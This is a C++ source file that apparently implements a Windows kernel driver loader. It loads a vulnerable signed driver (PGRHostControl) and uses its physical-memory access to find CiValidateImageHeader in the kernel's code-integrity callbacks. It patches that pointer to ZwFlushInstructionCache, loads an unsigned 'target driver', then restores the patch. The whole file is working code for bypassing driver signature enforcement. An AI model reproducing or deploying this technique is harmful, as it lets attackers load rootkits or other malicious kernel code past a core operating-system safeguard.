#define NOMINMAX
#include "driver-loader.h"

#include <Windows.h>
#include <string>

#include "servicemanager/servicemanager.h"
#include "pgrhostcontrol/pgrhostcontrol.h"
#include "tools/tools.h"
#include "logger/logger.h"
#include "globals.h"

#pragma comment(lib, "ntdll.lib")

namespace driver_loader {
	void load() {
        if (!tools::EnableDebugPrivilege()) {
            logger::error("Failed to enable debug privilege");
        }

        try {
            servicemanager::loadVulnerableDriver();

            if (!globals::driver.Open()) {
                logger::error("Failed to connect to PGRHostControl");
            }
            logger::info("Attached to PGRHostControl");

            globals::maxPhysicalMemory = tools::GetMaxPhysicalMemory();
            logger::info("Max physical memory: " + std::to_string(globals::maxPhysicalMemory / (1024ULL * 1024ULL)) + "MB");
            globals::ntoskrnlVirtualAddress = tools::GetNtoskrnkVirtualAddress();
            logger::info("ntoskrnl virtual address: " + tools::toHexString(globals::ntoskrnlVirtualAddress));
            globals::cr3 = tools::FindCR3();
            logger::info("cr3 physical address: " + tools::toHexString(globals::cr3));

            auto offsets = tools::ResolveKernelOffsetsStrict();
            if (!offsets) {
                throw std::runtime_error("Failed to resolve kernel offsets");
            }

            auto [seCiOffset, zwFlushOffset] = *offsets;

            /*uint64_t seCiOffset = 0xf04ca0;
            uint64_t zwFlushOffset = 0x6a9b00;*/

            uint64_t ciValidateHeaderPtrVa = globals::ntoskrnlVirtualAddress + seCiOffset + 0x20;
            uint64_t ciValidateHeaderPtrPhys = tools::VirtualToPhysical(globals::cr3, ciValidateHeaderPtrVa);

            // Read original
            uint64_t originalCallback = 0;
            globals::driver.Read(ciValidateHeaderPtrPhys, &originalCallback, 8);
            logger::info("Original CiValidateImageHeader: " + tools::toHexString(originalCallback));

            // Patch
            uint64_t ZwFlushInstructionCachePtr = globals::ntoskrnlVirtualAddress + zwFlushOffset;
            globals::driver.Write(ciValidateHeaderPtrPhys, &ZwFlushInstructionCachePtr, 8);
            logger::info("Patched CiValidateImageHeader to: " + tools::toHexString(ZwFlushInstructionCachePtr));

            servicemanager::loadTargetDriver();

            // Restore
            globals::driver.Write(ciValidateHeaderPtrPhys, &originalCallback, 8);
            logger::info("Restored CiValidateImageHeader");
            
            globals::driver.Close();
            servicemanager::unloadVulnerableDriver();
        }
        catch (const std::runtime_error& re) {
            logger::error(re.what());

            globals::driver.Close();
            servicemanager::unloadVulnerableDriver();
        }
	}
}